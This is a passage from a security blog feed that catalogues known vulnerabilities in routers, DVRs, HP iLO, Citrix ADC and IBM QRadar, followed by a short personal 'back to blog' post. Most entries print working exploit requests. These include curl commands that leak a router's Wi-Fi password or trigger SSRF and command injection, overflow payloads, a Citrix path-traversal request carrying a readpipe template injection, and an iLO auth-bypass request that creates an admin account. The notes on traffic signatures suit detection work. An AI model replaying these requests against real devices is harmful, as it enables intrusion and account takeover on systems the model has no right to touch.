href="https://github.com/Imanfeng/Apache-Solr-RCE">https://github.com/Imanfeng/Apache-Solr-RCE</a><br><a href="https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py">https://github.com/mpgn/CVE-2019-0192/blob/master/CVE-2019-0192.py</a><br><a href="https://www.exploit-db.com/exploits/47572">https://www.exploit-db.com/exploits/47572</a></p><h3 id="Belkin-N600DB-Multiple-Vulnerabilities"><a href="#Belkin-N600DB-Multiple-Vulnerabilities" class="headerlink" title="Belkin N600DB - Multiple Vulnerabilities"></a>Belkin N600DB - Multiple Vulnerabilities</h3><h4 id="description-6"><a href="#description-6" class="headerlink" title="description"></a>description</h4><p>Disclore wifi password:<br><code>curl --silent &quot;http://192.168.2.1/langchg.cgi&quot;</code> , <code>curl --silent &quot;http://192.168.2.1/adv_wifidef.cgi&quot;</code><br>Closed “HTTPD server” port:<br><code>curl --silent &quot;http://192.168.2.1/removepwd.cgi&quot; --data &quot;&quot;</code><br>Web Backdoor:<br><code>http://192.168.2.1/dev.htm</code><br>Server-Side Request Forgery (HTTP/FTP):<br><code>curl --silent &quot;http://192.168.2.1/proxy.cgi?chk&amp;url=http://45.33.32.156/&quot;</code><br>Command Injection:<br><code>curl --silent &quot;http://192.168.2.1/proxy.cgi?chk&amp;url=--help&quot;</code></p><h4 id="reference-6"><a href="#reference-6" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/43682">https://www.exploit-db.com/exploits/43682</a></p><h3 id="AVTECH-DVR-multiple-vulnerabilities"><a href="#AVTECH-DVR-multiple-vulnerabilities" class="headerlink" title="AVTECH DVR multiple vulnerabilities"></a>AVTECH DVR multiple vulnerabilities</h3><h4 id="description-7"><a href="#description-7" class="headerlink" title="description"></a>description</h4><p>在AVTHCH AVN801 DVR中发现了多个漏洞：</p><ol><li>CVE-2013-4980：通过利用RTSP数据包处理程序中的缓冲区溢出来执行任意代码<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SETUP Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: VLC media player (LIVE555 Streaming Media v2010.02.10)</span><br></pre></td></tr></table></figure></li><li>CVE-2013-4981：通过特制的HTTP POST请求利用 <strong>/cgi-bin/user/Config.cgi</strong> 中的缓冲区溢出来执行任意代码<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/user/Config.cgi?action=set&amp;Network.SMTP.Receivers=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></table></figure></li><li>CVE-2013-4982：绕过管理登录控制台的验证码，启用多个automated attack vectors。uri中有 <strong>/cgi-bin/nobody/VerifyCode.cgi</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cgi-bin&#x2F;nobody&#x2F;VerifyCode.cgi?account&#x3D;YWRtaW46YWRtaW4&#x3D;&amp;captcha_code&#x3D;FMUA&amp;verify_code&#x3D;FMUYyLOivRpgc HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: identity</span><br></pre></td></tr></table></figure></li></ol><h4 id="reference-7"><a href="#reference-7" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.coresecurity.com/core-labs/advisories/avtech-dvr-multiple-vulnerabilities">https://www.coresecurity.com/core-labs/advisories/avtech-dvr-multiple-vulnerabilities</a></p><h3 id="CVE-2017-12542"><a href="#CVE-2017-12542" class="headerlink" title="CVE-2017-12542"></a>CVE-2017-12542</h3><h4 id="description-8"><a href="#description-8" class="headerlink" title="description"></a>description</h4><p>iLO 全名是 Integrated Lights-out，它是惠普某些型号的服务器上集成的远程管理端口，它能够允许用户基于不同的操作系统从远端管理服务器。iLO 4中的CVE-2017-12542可以允许未经身份验证的远程攻击者绕过验证并执行任意代码。<br>当uri等于 <strong>/rest/v1/Accountservice/Accounts</strong> 且HTTP Headers中的Connection字段大于等于29个字符时即可绕过验证。在exp中如果收到的json中没有error和Items字段则认为漏洞存在。<br>向目标post添加用户的数据包，且Connection仍然大于等于29个字符，即可成功添加用户。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rest/v1/accountservice/accounts</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.19.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 253</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;UserName&quot;: &quot;admin&quot;, &quot;Password&quot;: &quot;admin123&quot;, &quot;Oem&quot;: &#123;&quot;Hp&quot;: &#123;&quot;Privileges&quot;: &#123;&quot;RemoteConsolePriv&quot;: true, &quot;iLOConfigPriv&quot;: true, &quot;VirtualMediaPriv&quot;: true, &quot;UserConfigPriv&quot;: true, &quot;VirtualPowerAndResetPriv&quot;: true, &quot;LoginPriv&quot;: true&#125;, &quot;LoginName&quot;: &quot;admin&quot;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reference-8"><a href="#reference-8" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py">https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py</a><br><a href="https://www.freebuf.com/vuls/167124.html">https://www.freebuf.com/vuls/167124.html</a></p><h3 id="CVE-2019-19781"><a href="#CVE-2019-19781" class="headerlink" title="CVE-2019-19781"></a>CVE-2019-19781</h3><h4 id="description-9"><a href="#description-9" class="headerlink" title="description"></a>description</h4><p>Citrix ADC的RCE漏洞。在 <strong>/vpns/</strong> 路径中有一个目录遍历漏洞。</p><ul><li>首先通过POST请求通过目录遍历漏洞创建恶意XML，payload包含在POST data中<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vpn/../vpns/portal/scripts/newbm.pl</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">NSC_USER</span>: ../../../netscaler/portal/templates/sobxivwokx</span><br><span class="line"><span class="attribute">NSC_NONCE</span>: 7</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 97</span><br><span class="line"></span><br><span class="line">url=127.0.0.1&amp;title=[% template.new(&#123;&#x27;BLOCK&#x27;=&#x27;print readpipe( xxxx )&#x27;&#125;)%]&amp;desc=desc&amp;UI_inuse=a</span><br></pre></td></tr></table></figure></li><li>然后通过GET请求去执行payload<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vpn/../vpns/portal/sobxivwokx.xml</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">NSC_USER</span>: dgxgvoankd</span><br><span class="line"><span class="attribute">NSC_NONCE</span>: 7</span><br></pre></td></tr></table></figure></li></ul><h4 id="reference-9"><a href="#reference-9" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/MalwareTech/CitrixHoneypot/blob/master/CitrixHoneypot.py">https://github.com/MalwareTech/CitrixHoneypot/blob/master/CitrixHoneypot.py</a><br><a href="https://github.com/trustedsec/cve-2019-19781">https://github.com/trustedsec/cve-2019-19781</a><br><a href="https://github.com/jas502n/CVE-2019-19781">https://github.com/jas502n/CVE-2019-19781</a><br><a href="https://www.jianshu.com/p/03b175711524">https://www.jianshu.com/p/03b175711524</a><br><a href="https://www.anquanke.com/post/id/197074?native.theme=2">https://www.anquanke.com/post/id/197074?native.theme=2</a></p><h3 id="Kguard-SHA104-SHA108-Bypass-Command-Injection"><a href="#Kguard-SHA104-SHA108-Bypass-Command-Injection" class="headerlink" title="Kguard SHA104 / SHA108 Bypass / Command Injection"></a>Kguard SHA104 / SHA108 Bypass / Command Injection</h3><h4 id="description-10"><a href="#description-10" class="headerlink" title="description"></a>description</h4><p>sha104和sha108都是Kguard公司的数字硬盘录像机，在处理身份验证和授权方面存在缺陷。例如，请求HI_SRDK_SYS_USERMNG_GetUserList会显示所有的用户名和密码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">REMOTE HI_SRDK_SYS_USERMNG_GetUserList MCTP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Accept</span>: text/HDP</span><br><span class="line"><span class="attribute">Content-Type</span>: text/HDP</span><br><span class="line"><span class="attribute">Func-Version</span>: 0x10</span><br><span class="line"><span class="attribute">Content-Length</span>: 51</span><br><span class="line"><span class="attribute">3Segment-Num</span>: 1</span><br><span class="line"><span class="attribute">Segment-Seq</span>: 1</span><br><span class="line"><span class="attribute">Data-Length</span>: 4</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">VMCTP/1.0 200 OK</span><br><span class="line"><span class="attribute">Content-Type</span>: text/HDP</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Return-Code</span>: 0</span><br><span class="line"><span class="attribute">Content-Length</span>: 2326</span><br><span class="line"><span class="attribute">Segment-Num</span>: 2</span><br><span class="line"><span class="attribute">Segment-Seq</span>: 1</span><br><span class="line"><span class="attribute">Data-Length</span>: 2240</span><br><span class="line"><span class="attribute">eric</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">admin</span></span><br><span class="line"><span class="attribute">111222</span></span><br><span class="line"><span class="attribute">111222</span></span><br></pre></td></tr></table></figure><p>特征是在Request中的HTTP版本部分是 <strong>MCTP</strong> 。另外还可以进行更改用户密码等操作。</p><h4 id="reference-10"><a href="#reference-10" class="headerlink" title="reference"></a>reference</h4><p><a href="https://cxsecurity.com/issue/WLB-2015030061">https://cxsecurity.com/issue/WLB-2015030061</a></p><h3 id="IBM-QRadar-SIEM-Unauthenticated-Remote-Code-Execution"><a href="#IBM-QRadar-SIEM-Unauthenticated-Remote-Code-Execution" class="headerlink" title="IBM QRadar SIEM Unauthenticated Remote Code Execution"></a>IBM QRadar SIEM Unauthenticated Remote Code Execution</h3><h4 id="description-11"><a href="#description-11" class="headerlink" title="description"></a>description</h4><p>uri:  <strong>/ForensicsAnalysisServlet/</strong><br>在第二个链接中有具体的利用过程。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ForensicsAnalysisServlet/?action=someaction</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Cookie</span>: SEC=owned; QRadarCSRF=superowned;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line">&#123;&quot;exceptionMessageValue&quot;:&quot;javax.servlet.ServletException: No valid forensics analysis solrDocIds parameter found.&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="reference-11"><a href="#reference-11" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/45005">https://www.exploit-db.com/exploits/45005</a><br><a href="https://ssd-disclosure.com/ssd-advisory-qradar-remote-command-execution/">https://ssd-disclosure.com/ssd-advisory-qradar-remote-command-execution/</a></p><h3 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h3><p>docker, es, hbase, hadoop, phpadmin, cms, couchdb, orientdb, upnp, ipmi, rpc, a2billing, boa</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution&quot;&gt;&lt;a href=&quot;#CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution&quot; class=&quot;headerlink&quot; title=&quot;CV</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Back to blog</title>
    <link href="http://woodpile27.cn/2020/08/08/hello-world/"/>
    <id>http://woodpile27.cn/2020/08/08/hello-world/</id>
    <published>2020-08-08T00:00:00.000Z</published>
    <updated>2020-09-15T10:24:06.548Z</updated>
    
    <content type="html"><![CDATA[<p>今天换了id，把原来的github.io项目给删了，要重新开始写博客啦~</p><h3 id="Why-restart"><a href="#Why-restart" class="headerlink" title="Why restart"></a>Why restart</h3><p>如果没有记错的话，上次写博客还是大二的时候，写博客本就是个好习惯，但是自己没能坚持下来。前不久wenji师傅请我吃饭时，强烈建议我养成记笔记或者写博客的习惯，把自己平时遇到的问题以及解决方法进行记录，可以提高自己的文字表达能力，而博客更是一个很好的展示自己的平台。我深以为然，决定开始养成这个习惯，逐渐把它变成”例行公事”。</p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>借用老板在这周开会时说的两句话吧：<strong>是否觉得在做的事情有意思？是否给部门带来了价值？</strong><br>弗洛伊德认为，people are comfortably numb，大多数人都活在舒适的麻木中。我们应该培育自己的积极性和激情。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天换了id，把原来的github.io项目给删了，要重新开始写博客啦~&lt;/p&gt;
&lt;h3 id=&quot;Why-restart&quot;&gt;&lt;a href=&quot;#Why-restart&quot; class=&quot;headerlink&quot; title=&quot;Why restart&quot;&gt;&lt;/a&gt;Why resta</summary>
      
    
    
    
    
  </entry>
  
</feed>
